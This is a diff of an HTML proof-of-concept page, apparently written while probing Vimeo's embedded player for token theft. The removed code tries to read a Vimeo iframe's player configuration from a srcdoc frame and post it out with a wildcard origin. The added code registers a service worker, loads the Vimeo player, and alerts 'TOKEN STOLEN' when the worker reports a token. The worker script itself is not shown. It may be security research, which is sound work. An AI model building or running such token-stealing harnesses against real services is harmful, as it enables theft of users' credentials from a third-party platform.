@@ -1,43 +1,39 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Service Worker Attack</title>
+</head>
 <body>
-    <h1>Vimeo srcdoc Attack</h1>
-    <iframe id="attack"></iframe>
+    <h1>Service Worker Token Theft</h1>
+    <button onclick="registerSW()">1. Register Service Worker</button>
+    <button onclick="loadVimeo()">2. Load Vimeo (after SW registered)</button>
+    <iframe id="vimeo" style="width:640px;height:360px"></iframe>
 
     <script>
-        // Try to create iframe with srcdoc that loads Vimeo
-        const iframe = document.getElementById('attack');
-        
-        iframe.srcdoc = `
-            <script>
-                // Load Vimeo player
-                const vimeoFrame = document.createElement('iframe');
-                vimeoFrame.src = 'https://player.vimeo.com/video/935884964';
-                document.body.appendChild(vimeoFrame);
-                
-                setTimeout(() => {
-                    try {
-                        // Try to access from srcdoc context
-                        const config = vimeoFrame.contentWindow.playerConfig;
-                        if (config) {
-                            // Send to parent
-                            window.parent.postMessage({
-                                attack: 'srcdoc',
-                                config: config
-                            }, '*');
-                        }
-                    } catch(e) {
-                        window.parent.postMessage({
-                            attack: 'srcdoc',
-                            error: e.message
-                        }, '*');
-                    }
-                }, 3000);
-            <\/script>
-        `;
+        async function registerSW() {
+            try {
+                // Register service worker
+                const reg = await navigator.serviceWorker.register('/sw.js');
+                console.log('✅ Service Worker registered:', reg);
+                alert('Service Worker registered. Now click "Load Vimeo"');
+            } catch (e) {
+                console.error('❌ SW registration failed:', e);
+            }
+        }
 
-        window.addEventListener('message', (e) => {
-            console.log('srcdoc result:', e.data);
+        function loadVimeo() {
+            document.getElementById('vimeo').src = 
+                'https://player.vimeo.com/video/935884964';
+        }
+
+        // Listen for messages from service worker
+        navigator.serviceWorker.addEventListener('message', (event) => {
+            console.log('Message from SW:', event.data);
+            
+            if (event.data.type === 'TOKEN_FOUND') {
+                console.log('🚨 TOKEN STOLEN:', event.data.token);
+                alert('TOKEN STOLEN: ' + event.data.token);
+            }
         });
     </script>
 </body>
